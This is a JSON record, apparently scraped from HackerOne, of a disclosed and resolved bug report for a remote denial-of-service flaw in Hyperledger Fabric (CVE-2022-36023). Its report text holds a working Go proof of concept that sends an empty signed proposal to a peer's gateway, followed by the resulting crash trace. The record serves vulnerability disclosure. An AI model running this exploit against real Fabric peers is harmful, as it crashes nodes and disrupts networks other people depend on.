@@ -1,0 +1,138 @@
+{
+  "id": 1635854,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjM1ODU0",
+  "url": "https://hackerone.com/reports/1635854",
+  "title": "Remote denial of service in HyperLedger Fabric",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2022-07-13T14:39:07.997Z",
+  "submitted_at": "2022-07-13T14:39:08.019Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "zqgnd",
+    "url": "/zqgnd",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hzq6m74g14gz182ozf9snikcj4jz/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22522,
+    "url": "https://hackerone.com/hyperledger",
+    "handle": "hyperledger",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4unr4nty3m2omunib0bwxy2s189l/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/4unr4nty3m2omunib0bwxy2s189l/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Linux Foundation Decentralized Trust",
+      "twitter_handle": "lfdecentralized",
+      "website": "https://www.lfdecentralizedtrust.org/",
+      "about": "An industry-wide open source initiative to advance blockchain technology, governed by The Linux Foundation."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2022-36023"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-09-01T14:05:00.956Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2022-08-09T13:24:29.907Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "How to reproduce\n1.Bring up the test network.(https://hyperledger-fabric.readthedocs.io/en/latest/test_network.html#bring-up-the-test-network)\n2.Run the PoC.\n```bash\ngo run poc.go -server=192.168.0.208:7051\n```\n```go\npackage main\n\nimport (\n\t\"context\"\n\t\"crypto/tls\"\n\t\"flag\"\n\t\"fmt\"\n\n\t\"github.com/hyperledger/fabric-protos-go/gateway\"\n\t\"github.com/hyperledger/fabric-protos-go/peer\"\n\n\t\"google.golang.org/grpc\"\n\t\"google.golang.org/grpc/credentials\"\n)\n\nfunc main() {\n\n\tvar srv string\n\tflag.StringVar(&srv, \"server\", \"localhost:7050\", \"The RPC server to connect to.\")\n\n\tflag.Parse()\n\n\tconfig := &tls.Config{\n\t\tInsecureSkipVerify: true,\n\t}\n\n\tconn, err := grpc.Dial(srv, grpc.WithTransportCredentials(credentials.NewTLS(config)))\n\t\n\tdefer func() {\n\t\t_ = conn.Close()\n\t}()\n\n\tif err != nil {\n\t\tfmt.Println(\"Error connecting:\", err)\n\t\treturn\n\t}\n\n\n\tpayload := &gateway.EvaluateRequest{}\n\n\n\tpayload.ProposedTransaction = &peer.SignedProposal{}\n\n\n\n\tresp, err := gateway.NewGatewayClient(conn).Evaluate(context.TODO(), payload)\n\tif err != nil {\n\t\tfmt.Println(\"Error connecting:\", err)\n\t\treturn\n\t}\n\n\n\tfmt.Println(\"resp:\", resp)\n\n}\n\n```\n3.Crash.\n```log\npanic: runtime error: invalid memory address or nil pointer dereference\n[signal SIGSEGV: segmentation violation code=0x1 addr=0x8 pc=0x157d6c7]\n\ngoroutine 381927 [running]:\ngithub.com/hyperledger/fabric/internal/pkg/gateway.getChannelAndChaincodeFromSignedProposal(0x0?)\n        /go/src/github.com/hyperledger/fabric/internal/pkg/gateway/apiutils.go:49 +0xe7\ngithub.com/hyperledger/fabric/internal/pkg/gateway.(*Server).Evaluate(0xc0001dd3e0, {0x1b55c58?, 0xc00359aa80}, 0xc003470600)\n        /go/src/github.com/hyperledger/fabric/internal/pkg/gateway/api.go:43 +0x85\ngithub.com/hyperledger/fabric-protos-go/gateway._Gateway_Evaluate_Handler.func1({0x1b55c58, 0xc00359aa80}, {0x18ed0a0?, 0xc003470600})\n        /go/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/gateway/gateway.pb.go:1176 +0x78\ngithub.com/hyperledger/fabric/internal/peer/node.unaryGrpcLimiter.func1({0x1b55c58, 0xc00359aa80}, {0x18ed0a0, 0xc003470600}, 0x195a8d5?, 0xc003400210)\n        /go/src/github.com/hyperledger/fabric/internal/peer/node/grpc_limiters.go:49 +0x38e\ngithub.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1({0x1b55c58?, 0xc00359aa80?}, {0x18ed0a0?, 0xc003470600?})\n        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x3a\ngithub.com/hyperledger/fabric/common/grpclogging.UnaryServerInterceptor.func1({0x1b55c58, 0xc00359a810}, {0x18ed0a0, 0xc003470600}, 0xc000308420, 0xc000308440)\n        /go/src/github.com/hyperledger/fabric/common/grpclogging/server.go:92 +0x305\ngithub.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1({0x1b55c58?, 0xc00359a810?}, {0x18ed0a0?, 0xc003470600?})\n        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x3a\ngithub.com/hyperledger/fabric/common/grpcmetrics.UnaryServerInterceptor.func1({0x1b55c58, 0xc00359a810}, {0x18ed0a0, 0xc003470600}, 0x7f0fb3c94a38?, 0xc000308460)\n        /go/src/github.com/hyperledger/fabric/common/grpcmetrics/interceptor.go:31 +0x17b\ngithub.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1({0x1b55c58?, 0xc00359a810?}, {0x18ed0a0?, 0xc003470600?})\n        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x3a\ngithub.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1({0x1b55c58, 0xc00359a810}, {0x18ed0a0, 0xc003470600}, 0xc000521ae0?, 0x17ab820?)\n        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:34 +0xbf\ngithub.com/hyperledger/fabric-protos-go/gateway._Gateway_Evaluate_Handler({0x189b040?, 0xc0001dd3e0}, {0x1b55c58, 0xc00359a810}, 0xc0034705a0, 0xc0001f0720)\n        /go/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/gateway/gateway.pb.go:1178 +0x138\ngoogle.golang.org/grpc.(*Server).processUnaryRPC(0xc0006a2e00, {0x1b5a950, 0xc0002f4480}, 0xc00321e100, 0xc00045a780, 0x2398808, 0xc00357a740)\n        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:1180 +0xc8f\ngoogle.golang.org/grpc.(*Server).handleStream(0xc0006a2e00, {0x1b5a950, 0xc0002f4480}, 0xc00321e100, 0xc00357a740)\n        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:1503 +0xa1b\ngoogle.golang.org/grpc.(*Server).serveStreams.func1.2()\n        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:843 +0x98\ncreated by google.golang.org/grpc.(*Server).serveStreams.func1\n        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:841 +0x28a\n```\n\n## Impact\n\nIt can easily break down as many peers as the attacker wants.",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2022-09-08T13:24:30.025Z",
+  "allow_singular_disclosure_after": -115695940.21184365,
+  "singular_disclosure_allowed": true,
+  "vote_count": 12,
+  "voters": [
+    "zy9ard3",
+    "shreyaschavhan",
+    "f1ras",
+    "sa1tama0",
+    "huh0x",
+    "shivammusic",
+    "bhaskar_ram",
+    "xramm",
+    "norwegianguy",
+    "zer00w",
+    "and 2 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 2994,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/hyperledger/fabric",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
